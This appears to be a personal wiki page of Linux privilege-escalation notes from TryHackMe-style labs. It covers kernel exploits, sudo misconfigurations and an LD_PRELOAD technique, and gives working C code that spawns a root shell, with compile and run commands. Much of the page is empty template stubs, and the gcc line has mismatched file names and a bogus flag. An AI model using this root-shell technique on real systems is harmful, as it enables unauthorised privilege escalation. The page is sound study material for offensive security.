===== Privilege Escalation =====

==== Linux ====

=== kernel ===
description - THM using 
Identify the kernel version
Search and find an exploit code for the version
	Example - https://www.linuxkernelcves.com/cves
Run exploit

1 Kernel version
<code>uname -r</code>


=== sudo apps ===
description - Apps that can be ran with elevated permissons
<code>
sudo -l
</code>
 (ALL) NOPASSWD: /usr/bin/nano
Search GTFO bins

=== LD_PRELOAD ===
description -  allows any program to use shared libraries
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
<code>
sudo -l
</code>
Look for env_keep+=LD_preload, means it's enabled
Simple C script (named pwned.c) to abuse
<code>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
</code>

Complile it as shared object

<code>gcc -fPIC -pwnwd -o pwnwd.so pwnwd.c -nostartfiles</code>

Run the program using LD_PRELOAD
<code>sudo LD_PRELOAD=<full path>/pwnwd.so find</code>

<code>whoami</code>


=== suid ===
description
<code>
code blocks
</code> 

===  ===
description
<code>
code blocks
</code> 

=== topic name ===
description
<code>
code blocks
</code> 

=== topic name ===
description
<code>
code blocks
</code> 

=== topic name ===
description
<code>
code blocks
</code> 

=== topic name ===
description
<code>
code blocks
</code> 


{{tag>tag1, tag2, "tag 3"}